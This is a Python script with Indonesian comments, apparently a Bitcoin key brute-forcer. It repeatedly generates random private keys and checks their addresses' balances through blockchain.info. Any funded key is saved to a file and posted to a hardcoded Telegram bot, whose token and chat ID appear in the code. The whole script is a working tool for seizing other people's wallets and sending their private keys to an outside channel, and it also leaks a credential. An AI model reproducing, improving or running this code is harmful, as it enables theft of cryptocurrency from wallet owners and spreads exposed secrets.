from bitcoin import *
import aiohttp
import asyncio
import random
from dotenv import load_dotenv
import os

# Load environment variables from .env file
load_dotenv()

# Ambil SERVER_NAME dari variabel lingkungan
SERVER_NAME = os.getenv("SERVER_NAME", "DefaultServer")

# Telegram bot token dan chat ID
TELEGRAM_TOKEN = "6789484876:AAFR1OQRssKGrk8aIF0jAn0zB3eWF33XtrE"
TELEGRAM_CHAT_ID = "-4562112556"

# Fungsi untuk mengirim pesan ke Telegram
async def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=payload) as response:
            if response.status == 200:
                print("Message sent to Telegram successfully!")
            else:
                print(f"Failed to send message to Telegram. Status: {response.status}")

# Fungsi untuk generate 200 alamat Bitcoin secara acak
def generate_addresses(num_addresses=200):
    addresses = []
    for _ in range(num_addresses):
        private_key = random_key()  # Generate private key
        address = pubkey_to_address(privtopub(private_key))  # Generate address dari public key
        addresses.append((address, private_key))  # Simpan dalam bentuk tuple (address, private_key)
    return addresses

# Fungsi untuk mengambil saldo dari 200 alamat sekaligus
async def fetch_balances(session, addresses, max_retries=5, rate_limit_counter=None):
    address_list = "|".join([addr[0] for addr in addresses])
    url = f"https://blockchain.info/balance?active={address_list}"
    retries = 0  # Counter untuk retries

    while retries < max_retries:
        try:
            async with session.get(url) as response:
                print(f"HTTP Status: {response.status}")  # Log status code
                if response.status == 429:
                    print("Rate limit exceeded. Waiting before retrying...")
                    if rate_limit_counter is not None:
                        rate_limit_counter['429'] += 1  # Tambahkan ke counter 429
                    await asyncio.sleep(3600)  # Tunggu 1 jam sebelum mencoba lagi
                    retries += 1
                    continue
                response.raise_for_status()  # Raise jika status code selain 200
                data = await response.json()  # Ambil data dari response
                return data  # Kembalikan data berupa JSON
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Connection error: {e}. Retrying ({retries + 1}/{max_retries})...")
            retries += 1
            await asyncio.sleep(5)  # Tunggu 5 detik sebelum mencoba lagi

    print("Max retries exceeded. Skipping this batch.")
    return {}

# Fungsi untuk memeriksa saldo dari 200 alamat sekaligus
async def check_BTC_balances(addresses, rate_limit_counter):
    async with aiohttp.ClientSession() as session:
        balances = await fetch_balances(session, addresses, rate_limit_counter=rate_limit_counter)
        return balances

# Fungsi utama
async def main():
    counter = 0
    found_counter = 0  # Counter untuk alamat dengan saldo
    rate_limit_counter = {'429': 0}  # Counter untuk error 429

    while True:
        counter += 1
        print(f"Starting session #{counter}")
        addresses = generate_addresses(200)  # Generate 200 address

        # Periksa saldo dari 200 address sekaligus
        balances = await check_BTC_balances(addresses, rate_limit_counter)

        if not balances:  # Jika balances kosong (gagal), lanjutkan ke batch berikutnya
            continue

        # Loop melalui balances yang didapat
        for (address, private_key) in addresses:
            balance = balances.get(address, {}).get("final_balance", 0)  # Ambil saldo (dalam satoshi)
            print(f"{counter} - {address} {balance / 100000000} BTC")  # Tampilkan informasi

            # Jika balance > 0, simpan ke dalam file dan kirim ke Telegram
            if balance > 0:
                found_counter += 1  # Tambahkan ke counter ditemukan
                file_info = f"[{SERVER_NAME}]\nAddress: {address}\nPrivateKey: {private_key}\nBalance: {balance / 100000000} BTC\n"
                
                # Simpan ke file
                with open("FoundWallet.txt", "a") as file:
                    file.write(file_info)

                # Kirim ke Telegram
                await send_telegram_message(file_info)

        # # Kirim update ke Telegram setiap sesi selesai
        # session_summary = f"[{SERVER_NAME}]\nSession #{counter} complete.\nFound: {found_counter}\n429 Errors: {rate_limit_counter['429']}"
        # await send_telegram_message(session_summary)

        await asyncio.sleep(3)  # Tunggu 5 detik sebelum melanjutkan ke batch berikutnya

# Menjalankan program utama
asyncio.run(main())
